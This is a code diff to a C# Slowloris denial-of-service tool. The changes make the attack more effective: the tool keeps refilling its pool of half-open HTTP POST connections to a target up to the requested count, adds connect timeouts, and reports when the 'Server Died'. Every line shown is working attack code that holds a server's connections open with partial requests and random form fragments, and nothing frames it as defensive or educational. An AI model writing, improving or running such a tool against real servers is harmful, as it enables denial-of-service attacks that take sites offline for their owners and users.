@@ -107,9 +107,9 @@ namespace slowloris
         #endregion
         private static void SlowLoris(string ip, int port, int sockets, int timeout)
         {
-            new Thread(() => KeepAlive(timeout)).Start();
+            new Thread(() => KeepAlive(sockets, timeout)).Start();
 
-            for (int x = 0; x < sockets; x++) {
+            while (SlowLorisConnections.Count < sockets) {
                 // Add New Connection
                 try
                 {
@@ -126,11 +126,14 @@ namespace slowloris
             }
         }
 
-        private static void KeepAlive(int timeout)
+        private static void KeepAlive(int sockets, int timeout)
         {
+            ConsoleColor before = Console.ForegroundColor;
+
             while (true)
             {
-                Console.WriteLine(" [+] Sending Keep Alive to {0} connections!", SlowLorisConnections.Count);
+                bool died = false;
+
                 for(int x = 0; x < SlowLorisConnections.Count; x++)
                 {
                     try
@@ -149,12 +152,19 @@ namespace slowloris
                         }
                         catch (Exception)
                         {
-                            ConsoleColor before = Console.ForegroundColor;
                             Console.ForegroundColor = ConsoleColor.Red;
                             Console.WriteLine(" [*] Server Died at " + DateTime.Now);
                             Console.ForegroundColor = before;
+                            died = true;
                         }
                     }
+                }
+
+                if (SlowLorisConnections.Count != 0 && !died)
+                {
+                    Console.ForegroundColor = ConsoleColor.Green;
+                    Console.WriteLine(" [+] Sent Keep Alive to {0} connections!", SlowLorisConnections.Count);
+                    Console.ForegroundColor = before;
                 }
 
                 // Sleep For timeout After Every Itteration
@@ -176,11 +186,19 @@ namespace slowloris
             this.port = port;
             randomizer = new Random(DateTime.UtcNow.Millisecond);
 
-            TCPWriter = new StreamWriter(new TcpClient(ip, port).GetStream());
+            // Connect & Check for Timeout
+            TcpClient TCPClient = new TcpClient();
+            var result = TCPClient.BeginConnect(ip, port, null, null);
+            var success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(3));
+            if (!success)
+            {
+                throw new Exception("Connection Timed Out!");
+            }
+            TCPWriter = new StreamWriter(TCPClient.GetStream());
             TCPWriter.AutoFlush = false;
 
             TCPWriter.WriteLine(string.Format("POST / HTTP/1.1"));
-            TCPWriter.WriteLine(string.Format("Content-type: application/x-www-form-urlencoded"));
+            TCPWriter.WriteLine("Content-type: application/x-www-form-urlencoded");
             TCPWriter.WriteLine(string.Format("Content-Length: {0}", randomizer.Next(0, 5000)));
             TCPWriter.WriteLine(string.Format("User-Agent: {0}", ua));
             TCPWriter.WriteLine("Accept-language: en-US,en,q=0.5");
@@ -196,6 +214,7 @@ namespace slowloris
             "&search={0}",
             "&value={0}"
         };
+
         public void SendKeepAlive() {
             TCPWriter.Write(string.Format(postvalues[randomizer.Next(0, postvalues.Count)], randomizer.Next(1, 5000)));
             TCPWriter.Flush();
